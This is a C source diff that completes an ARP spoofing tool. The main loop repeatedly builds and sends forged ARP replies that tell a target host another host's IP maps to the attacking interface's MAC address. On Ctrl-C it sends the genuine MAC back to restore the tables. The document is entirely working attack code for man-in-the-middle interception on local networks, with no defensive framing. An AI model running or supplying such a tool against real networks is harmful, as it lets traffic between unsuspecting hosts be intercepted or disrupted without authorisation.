@@ -9,9 +9,20 @@
 
 int running = 1;
 
+char *dest_ip;
+char *dest_mac;
+char *src_ip;
+char *src_mac;
+char *interface;
+
 void sigint(int sig){
-    sleep(2);
-    printf("exiting now\n");
+    printf("\nrestoring initial ARP tables...\n");
+    for(int i = 0; i < 5; i++){
+        unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+        arpr_build(dest_ip, dest_mac, src_ip, src_mac, packet);
+        arpr_send(packet, interface);
+        sleep(1);
+    }
     running = 0;
 }
 
@@ -19,13 +30,24 @@ int main(int argc, char *argv[]){
 
     signal(SIGINT, sigint);
 
+    dest_ip = argv[1];
+    dest_mac = get_mac_address(dest_ip);
+
+    src_ip = argv[2];
+    src_mac = get_mac_address(src_ip);
+
+    interface = argv[3];
+
+    char *spoof_mac = interface_mac_address(interface);
+
     while(running){
-        printf("%s | running...\n", argv[1]);
-        char *mac = get_mac_address(argv[1]);
+        unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+        arpr_build(dest_ip, dest_mac, src_ip, spoof_mac, packet);
+        arpr_send(packet, interface);
         sleep(1);
     }
 
-    printf("exited the loop\n");
+    printf("terminated successfully\n");
 
     return 0;
 }
